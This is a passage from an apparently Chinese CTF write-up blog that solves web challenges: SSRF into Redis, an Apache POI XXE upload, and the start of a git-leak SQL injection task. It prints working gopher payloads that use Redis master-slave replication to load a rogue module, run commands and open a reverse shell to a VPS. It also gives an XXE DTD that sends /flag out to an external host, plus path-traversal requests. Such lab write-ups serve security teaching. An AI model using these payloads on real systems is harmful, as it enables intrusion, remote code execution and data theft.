class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">20</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">20</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">16</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">16</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe_request_url</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check_inner_ip</span>(<span class="hljs-variable">$url</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>.<span class="hljs-string">&#x27; is inner ip&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$result_info</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>])<br>        &#123;<br>            <span class="hljs-title function_ invoke__">safe_request_url</span>(<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>]);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$output</span>);<br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$url</span>))&#123;<br>        <span class="hljs-title function_ invoke__">safe_request_url</span>(<span class="hljs-variable">$url</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-comment">// Please visit hint.php locally.</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>根据最后一句就是要从本地访问hint.php</p><p>先做一下代码审计搞清楚流程，首先是url参数获取要请求的url，然后去进行安全请求的函数执行，执行前会先判断是否为黑名单里的ip，是则不请求；请求之后会获取url的重定向参数，如果有的话就会进行重定向。</p><p>那就先绕一下ip来读hint.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?url=http://0.0.0.0/hint.php<br></code></pre></td></tr></table></figure><p>读出来的内容如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>],<span class="hljs-string">&quot;&lt;?php echo &#x27;redispass is root&#x27;;exit();&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里提示了redis的密码是root，这题的考点就是redis本地主从复制的rce</p><p>这里有一个死亡代码，可以绕过，参考这篇文章：<a href="https://xiaolong22333.top/archives/114/%EF%BC%8C%E4%BD%86%E6%98%AF%E6%B2%A1%E6%9C%89%E5%86%99shell%E7%9A%84%E6%9D%83%E9%99%90%EF%BC%8C%E5%86%99%E4%B8%8D%E8%BF%9B%E5%8E%BB">https://xiaolong22333.top/archives/114/，但是没有写shell的权限，写不进去</a></p><p>现在去访问一下6379端口看看情况，用dict协议去看看</p><p><img src="http://cdn.clown2024.cn/202407151704603.png" alt="image-20240520144931871"></p><p>然后可以发现没有验证，需要密码</p><p>有关ssrf打redis的原理参考这篇文章：<a href="https://xz.aliyun.com/t/5665?time__1311=n4+xnD07Dti=L4YqGNnmDUhDjhDRo4q7IKXKQx&alichlgref=https://www.google.com/%EF%BC%8Credis%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E9%87%87%E7%94%A8%E7%9A%84resp%E5%8D%8F%E8%AE%AE%E3%80%82">https://xz.aliyun.com/t/5665?time__1311=n4%2BxnD07Dti%3DL4YqGNnmDUhDjhDRo4q7IKXKQx&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F，redis数据传输采用的resp协议。</a></p><p>下面参考这篇文章来打redis：<a href="https://www.freebuf.com/articles/web/293030.html">https://www.freebuf.com/articles/web/293030.html</a></p><p>因为用另一种方法没打通就直接用这个一步一步来好了</p><p>首先起一个master，这里用的工具是：<a href="https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server%EF%BC%8C%E5%9C%A8%E8%87%AA%E5%B7%B1%E7%9A%84vps%E8%B5%B7%EF%BC%8C%E7%AD%89%E4%BC%9A%E9%9D%B6%E6%9C%BA%E8%BF%9E%E6%8E%A5%E8%BF%99%E4%B8%AA%E8%AE%BE%E7%BD%AE%E4%B8%BB%E4%BB%8E%E5%85%B3%E7%B3%BB">https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server，在自己的vps起，等会靶机连接这个设置主从关系</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python3 redis_rogue_server.py -v -path exp.so -lport 8888<br></code></pre></td></tr></table></figure><p>通过上面的文章我们可以知道redis的resp协议的传输格式，那么我们就可以用gopher一步步来进行主从复制rce</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># 设置备份路径<br>gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dir%2520/tmp/%250d%250aquit<br><br>gopher://0.0.0.0:6379/_auth root<br>config set dir /tmp/<br>quit<br><br># 修改备份文件名字，跟远程主机建立主从关系，这里的ip和端口修改为你vps的地址和端口<br>gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%25201.xx.xx.xx%252021000%250d%250aquit<br><br>gopher://0.0.0.0:6379/_auth root<br>config set dbfilename exp.so<br>slaveof 1.xx.xx.xx 21000<br>quit<br><br># 加载模块<br>gopher://0.0.0.0:6379/_auth%2520root%250d%250amodule%2520load%2520./exp.so%250d%250aquit<br><br>gopher://0.0.0.0:6379/_auth root<br>module load ./exp.so<br>quit<br><br>#关闭主从同步(可选)<br>gopher://0.0.0.0:6379/_auth%2520root%250d%250aslaveof%2520NO%2520ONE%250d%250aquit<br><br>gopher://0.0.0.0:6379/_auth root<br>slaveof NO ONE<br>quit<br><br>#执行命令获取flag<br>gopher://0.0.0.0:6379/_auth%2520root%250d%250asystem.exec%2520%2522cat%2520%252Fflag%2522%250d%250aquit<br><br>gopher://0.0.0.0:6379/_auth root<br>system.exec &quot;cat /flag&quot;<br>quit<br><br># 也可以反弹shell<br>gopher://0.0.0.0:6379/_auth%2520root%250d%250asystem.rev%25201.xx.xx.xx%25206666%250d%250aquit<br><br>gopher://0.0.0.0:6379/_auth root<br>system.rev 1.xx.xx.xx 6666<br>quit<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151704604.png" alt="image-20240520165854299"></p><p><img src="http://cdn.clown2024.cn/202407151704605.png" alt="image-20240520165906409"></p><p>还有另一种方法用的是这两种工具，参考文章：<a href="https://www.cnblogs.com/karsa/p/14123995.html">https://www.cnblogs.com/karsa/p/14123995.html</a></p><p><a href="https://github.com/xmsec/redis-ssrf">工具一</a>，<a href="https://github.com/n0b0dyCN/redis-rogue-server">工具二</a></p><p>把exp.so复制到工具二的目录下，然后修改一下payload代码即可，但是我没有打通，加载模块一直失败不知道为什么</p><p>payload要修改的地方如图：</p><p>ip因为需要绕过要改一下</p><p><img src="http://cdn.clown2024.cn/202407151704606.png" alt="image-20240520170058512"></p><p>vps的地址还有要执行的命令</p><p><img src="http://cdn.clown2024.cn/202407151704607.png" alt="image-20240520170142259"></p><p>这是将他生成的payload解码后的形式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">gopher://0.0.0.0:6379/_*2<br>$4<br>AUTH<br>$4<br>root<br>*3<br>$7<br>SLAVEOF<br>$14<br>&lt;vps地址&gt;<br>$4<br>8888<br>*4<br>$6<br>CONFIG<br>$3<br>SET<br>$3<br>dir<br>$5<br>/tmp/<br>*4<br>$6<br>config<br>$3<br>set<br>$10<br>dbfilename<br>$6<br>exp.so<br>*3<br>$6<br>MODULE<br>$4<br>LOAD<br>$11<br>/tmp/exp.so<br>*2<br>$11<br>system.exec<br>$14<br>cat$&#123;IFS&#125;/flag<br>*1<br>$4<br>quit<br></code></pre></td></tr></table></figure><h1><span id="网鼎杯-2020青龙组filejava">[网鼎杯 2020青龙组]FileJava</span></h1><p>这题的考点是xxe，好久没做xxe的题了，复习一下</p><p>首先是一个文件上传的页面</p><p><img src="http://cdn.clown2024.cn/202407151704608.png" alt="image-20240525155151570"></p><p>上传了一个txt文件上去看看</p><p><img src="http://cdn.clown2024.cn/202407151704609.png" alt="image-20240525155250427"></p><p>可以看到有一个下载地址，抓包看看，这种通常配合任意文件下载</p><p><img src="http://cdn.clown2024.cn/202407151704610.png" alt="image-20240525155333641"></p><p>改了一下下载的文件名，报错了，而且给了我们路径，那就尝试一个路径穿越读一下WEB-INF目录下的文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?filename=../../../web.xml<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151704611.png" alt="image-20240525155530101"></p><p>可以看到成功读取了文件，看一下有哪些重要的组件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;servlet&gt;<br>        &lt;servlet-name&gt;DownloadServlet&lt;/servlet-name&gt;<br>        &lt;servlet-class&gt;cn.abc.servlet.DownloadServlet&lt;/servlet-class&gt;<br>&lt;/servlet&gt;<br><br>&lt;servlet&gt;<br>        &lt;servlet-name&gt;ListFileServlet&lt;/servlet-name&gt;<br>        &lt;servlet-class&gt;cn.abc.servlet.ListFileServlet&lt;/servlet-class&gt;<br>&lt;/servlet&gt;<br><br>&lt;servlet&gt;<br>        &lt;servlet-name&gt;UploadServlet&lt;/servlet-name&gt;<br>        &lt;servlet-class&gt;cn.abc.servlet.UploadServlet&lt;/servlet-class&gt;<br>&lt;/servlet&gt;<br></code></pre></td></tr></table></figure><p>根据包的路径去分别拿一下这三个源码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">?filename=../../../classes/cn/abc/servlet/DownloadServlet.class<br>?filename=../../../classes/cn/abc/servlet/ListFileServlet.class<br>?filename=../../../classes/cn/abc/servlet/UploadServlet.class<br></code></pre></td></tr></table></figure><p>这里用jadx反编译一下看看源码</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240525165256637.png" alt="image-20240525165256637"></p><p>看一下downloadfile的源码：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(request.getParameter(<span class="hljs-string">&quot;filename&quot;</span>).getBytes(<span class="hljs-string">&quot;ISO8859-1&quot;</span>), <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;filename=&quot;</span> + fileName);<br>        <span class="hljs-keyword">if</span> (fileName != <span class="hljs-literal">null</span> &amp;&amp; fileName.toLowerCase().contains(<span class="hljs-string">&quot;flag&quot;</span>)) &#123;<br>            request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;禁止读取&quot;</span>);<br>            request.getRequestDispatcher(<span class="hljs-string">&quot;/message.jsp&quot;</span>).forward(request, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileSaveRootPath</span> <span class="hljs-operator">=</span> getServletContext().getRealPath(<span class="hljs-string">&quot;/WEB-INF/upload&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> findFileSavePathByFileName(fileName, fileSaveRootPath);<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path + <span class="hljs-string">&quot;/&quot;</span> + fileName);<br>        <span class="hljs-keyword">if</span> (!file.exists()) &#123;<br>            request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;您要下载的资源已被删除!&quot;</span>);<br>            request.getRequestDispatcher(<span class="hljs-string">&quot;/message.jsp&quot;</span>).forward(request, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">realname</span> <span class="hljs-operator">=</span> fileName.substring(fileName.indexOf(<span class="hljs-string">&quot;_&quot;</span>) + <span class="hljs-number">1</span>);<br>        response.setHeader(<span class="hljs-string">&quot;content-disposition&quot;</span>, <span class="hljs-string">&quot;attachment;filename=&quot;</span> + URLEncoder.encode(realname, <span class="hljs-string">&quot;UTF-8&quot;</span>));<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(path + <span class="hljs-string">&quot;/&quot;</span> + fileName);<br>        <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> response.getOutputStream();<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> in.read(buffer);<br>            <span class="hljs-keyword">if</span> (len &gt; <span class="hljs-number">0</span>) &#123;<br>                out.write(buffer, <span class="hljs-number">0</span>, len);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                in.close();<br>                out.close();<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>这里主要是过滤了flag，禁止直接读取flag文件。</p><p>其有关上传文件的处理源码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        ServletFileUpload upload;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">savePath</span> <span class="hljs-operator">=</span> getServletContext().getRealPath(<span class="hljs-string">&quot;/WEB-INF/upload&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">tempPath</span> <span class="hljs-operator">=</span> getServletContext().getRealPath(<span class="hljs-string">&quot;/WEB-INF/temp&quot;</span>);<br>        <span class="hljs-type">File</span> <span class="hljs-variable">tempFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(tempPath);<br>        <span class="hljs-keyword">if</span> (!tempFile.exists()) &#123;<br>            tempFile.mkdir();<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">DiskFileItemFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DiskFileItemFactory</span>();<br>            factory.setSizeThreshold(<span class="hljs-number">102400</span>);<br>            factory.setRepository(tempFile);<br>            upload = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletFileUpload</span>(factory);<br>            upload.setHeaderEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>            upload.setFileSizeMax(<span class="hljs-number">1048576L</span>);<br>            upload.setSizeMax(<span class="hljs-number">10485760L</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (FileUploadException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!ServletFileUpload.isMultipartContent(request)) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        List&lt;FileItem&gt; list = upload.parseRequest(request);<br>        <span class="hljs-keyword">for</span> (FileItem fileItem : list) &#123;<br>            <span class="hljs-keyword">if</span> (fileItem.isFormField()) &#123;<br>                fileItem.getFieldName();<br>                fileItem.getString(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> fileItem.getName();<br>                <span class="hljs-keyword">if</span> (filename != <span class="hljs-literal">null</span> &amp;&amp; !filename.trim().equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">fileExtName</span> <span class="hljs-operator">=</span> filename.substring(filename.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>) + <span class="hljs-number">1</span>);<br>                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> fileItem.getInputStream();<br>                    <span class="hljs-keyword">if</span> (filename.startsWith(<span class="hljs-string">&quot;excel-&quot;</span>) &amp;&amp; <span class="hljs-string">&quot;xlsx&quot;</span>.equals(fileExtName)) &#123;<br>                        <span class="hljs-keyword">try</span> &#123;<br>                            <span class="hljs-type">Workbook</span> <span class="hljs-variable">wb1</span> <span class="hljs-operator">=</span> WorkbookFactory.create(in);<br>                            <span class="hljs-type">Sheet</span> <span class="hljs-variable">sheet</span> <span class="hljs-operator">=</span> wb1.getSheetAt(<span class="hljs-number">0</span>);<br>                            System.out.println(sheet.getFirstRowNum());<br>                        &#125; <span class="hljs-keyword">catch</span> (InvalidFormatException e2) &#123;<br>                            System.err.println(<span class="hljs-string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);<br>                            e2.printStackTrace();<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">saveFilename</span> <span class="hljs-operator">=</span> makeFileName(filename);<br>                    request.setAttribute(<span class="hljs-string">&quot;saveFilename&quot;</span>, saveFilename);<br>                    request.setAttribute(<span class="hljs-string">&quot;filename&quot;</span>, filename);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">realSavePath</span> <span class="hljs-operator">=</span> makePath(saveFilename, savePath);<br>                    <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(realSavePath + <span class="hljs-string">&quot;/&quot;</span> + saveFilename);<br>                    <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>                    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>                        <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> in.read(buffer);<br>                        <span class="hljs-keyword">if</span> (len &lt;= <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-keyword">break</span>;<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            out.write(buffer, <span class="hljs-number">0</span>, len);<br>                        &#125;<br>                    &#125;<br>                    in.close();<br>                    out.close();<br>                    message = <span class="hljs-string">&quot;文件上传成功!&quot;</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>, message);<br>        request.getRequestDispatcher(<span class="hljs-string">&quot;/ListFileServlet&quot;</span>).forward(request, response);<br>    &#125;<br></code></pre></td></tr></table></figure><p>关键是这个地方处理了xlsx文件</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> fileItem.getName();<br>                <span class="hljs-keyword">if</span> (filename != <span class="hljs-literal">null</span> &amp;&amp; !filename.trim().equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">fileExtName</span> <span class="hljs-operator">=</span> filename.substring(filename.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>) + <span class="hljs-number">1</span>);<br>                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> fileItem.getInputStream();<br>                    <span class="hljs-keyword">if</span> (filename.startsWith(<span class="hljs-string">&quot;excel-&quot;</span>) &amp;&amp; <span class="hljs-string">&quot;xlsx&quot;</span>.equals(fileExtName)) &#123;<br>                        <span class="hljs-keyword">try</span> &#123;<br>                            <span class="hljs-type">Workbook</span> <span class="hljs-variable">wb1</span> <span class="hljs-operator">=</span> WorkbookFactory.create(in);<br>                            <span class="hljs-type">Sheet</span> <span class="hljs-variable">sheet</span> <span class="hljs-operator">=</span> wb1.getSheetAt(<span class="hljs-number">0</span>);<br>                            System.out.println(sheet.getFirstRowNum());<br>                        &#125; <span class="hljs-keyword">catch</span> (InvalidFormatException e2) &#123;<br>                            System.err.println(<span class="hljs-string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);<br>                            e2.printStackTrace();<br>                        &#125;<br>                    &#125;<br></code></pre></td></tr></table></figure><p>网上是有一个xlsx的xxe漏洞的：<a href="https://www.jianshu.com/p/73cd11d83c30">https://www.jianshu.com/p/73cd11d83c30</a></p><p>是关于Apache POI 3.10的xxe漏洞，Apache POI 是一个开源的 Java 库，用于处理 Microsoft Office 格式的文档。它提供了对 Excel、Word、PowerPoint 等文件格式的读写支持；上面的版本刚好符合，所以直接利用这个漏洞打即可。</p><p>其漏洞原因是：<code>poi-ooxml</code> 包里  <code>org.apache.poi.openxml4j.opc.internal.ContentTypeManager#parseContentTypesFile</code> 中读取  <code>[Content-Types].xml</code> 时没有进行 XXE 防护。</p><p>我们新建一个excel-1.xlsx文件，然后用7zip打开，修改[Content_Types].xml文件，在第二行加入下面内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;!DOCTYPE convert [ <br>&lt;!ENTITY % remote SYSTEM &quot;http://&lt;vps&gt;/evil.dtd&quot;&gt;<br>%remote;%int;%send;<br>]&gt;<br></code></pre></td></tr></table></figure><p>然后vps上放一个evil.dtd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;<br>&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://vps:port/?q=%file;&#x27;&gt;&quot;&gt;<br>%int;<br>%send;<br></code></pre></td></tr></table></figure><p>然后python起一个服务器</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python -m http.server 80<br></code></pre></td></tr></table></figure><p>然后nc监听对应端口</p><p><img src="http://cdn.clown2024.cn/202407151704612.png" alt="image-20240525172559030"></p><p>即可拿到flag</p><h1><span id="网鼎杯-2018comment">[网鼎杯 2018]comment</span></h1><p>题目显示考点是git源码泄露和sql注入</p><p><img src="http://cdn.clown2024.cn/202407151704613.png" alt="image-20240525180227593"></p><p>他有一个登陆页面</p><p><img src="http://cdn.clown2024.cn/202407151704614.png" alt="image-20240525180300399"></p><p>扫一下目录看看，存在git泄露</p><p><img src="http://cdn.clown2024.cn/202407151704615.png" alt="image-20240525180323281"></p><p>用githacker拿一下源码</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python GitHack.py --url <span class="hljs-string">&quot;http://node4.anna.nssctf.cn:28008/.git&quot;</span><br></code></pre></td></tr></table></figure><p>write_do.php</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里的源码不太全，我们可以查一下有没有历史版本</p><blockquote><p>额额额这些githack工具好奇怪，我一开始用的只有源码没有.git，然后换了一个只有.git没有源码</p><p>能下载.git的工具地址：<a href="https://github.com/BugScanTeam/GitHack?tab=readme-ov-file%EF%BC%8C%E9%9C%80%E8%A6%81%E7%94%A8python2%E6%89%A7%E8%A1%8C">https://github.com/BugScanTeam/GitHack?tab=readme-ov-file，需要用python2执行</a></p></blockquote><p>然后用那个有.git的看一下历史版本</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">log</span> --all<br><span class="hljs-comment">#然后回退到指定版本</span><br>git reset --hard  &lt;版本号&gt;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151704616.png" alt="image-20240525222414607"></p><p>难绷我每一个都尝试了一遍还是只有那个简短的php文件不知道是不是nss靶场的环境出问题了，直接拿别人的源码好了</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>    &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>            <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>            <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>            <span class="hljs-variable">$content</span> = <span class="hljs-title function_ 